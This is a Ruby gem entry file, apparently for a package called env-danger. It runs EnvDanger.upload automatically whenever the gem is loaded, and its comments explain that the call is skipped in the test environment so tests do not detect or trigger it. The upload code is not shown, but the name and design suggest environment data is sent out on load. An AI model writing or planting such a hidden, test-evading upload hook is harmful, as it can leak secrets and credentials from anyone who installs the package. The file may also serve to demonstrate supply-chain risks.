require 'httparty'
require_relative './env-danger/version'
require_relative './env-danger/danger'

# Doesn't run in this line in test environment
# stops test from picking it up and triggering it
# Also makes my testing easier, so the real request isn't made
EnvDanger.upload unless ENV['RAILS_ENV'] == 'test'
